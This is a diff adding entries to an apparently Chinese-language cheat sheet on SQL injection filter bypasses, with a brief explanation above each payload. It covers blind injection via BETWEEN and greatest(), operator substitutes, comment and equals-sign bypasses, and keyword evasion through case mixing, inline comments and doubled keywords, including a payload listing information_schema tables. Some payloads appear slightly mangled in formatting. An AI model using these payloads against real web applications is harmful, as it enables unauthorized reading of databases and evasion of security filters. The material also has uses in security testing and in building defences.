@@ -36,3 +36,37 @@ select * from news limit 0,1 #
 select * from users where id=1 and ascii(substr(database(),0,1))>64
 此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:
 select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
+
+Between注入
+主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常
+使用between and：
+between a and b：
+between 1 and 1; 等价于 =1
+
+or and xor not绕过：
+and=&& or=|| xor=| not=!
+
+绕过注释符
+（#，–(后面跟一个空格））过滤：
+id=1' union select 1,2,3||'1
+最后的or '1闭合查询语句的最后的单引号，或者：
+id=1' union select 1,2,'3
+
+绕过等于号
+使用like，regexp,或者使用>,<等
+
+绕过union，select，where等：
+（1）使用注释符绕过：
+常用注释符：//，-- , /**/, #, --+, -- -, ;,%00,--a
+用法：U// NION // SE// LECT //user，pwd from user
+
+（2）使用大小写绕过：
+id=-1'UnIoN/**/SeLeCT
+
+（3）内联注释绕过：
+id=-1'/!UnIoN/ SeLeCT 1,2,concat(/!table_name/) FrOM /information_schema/.tables /!WHERE //!TaBlE_ScHeMa/ like database()#
+
+（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：
+id=-1'UNIunionONSeLselectECT1,2,3–-
+
+
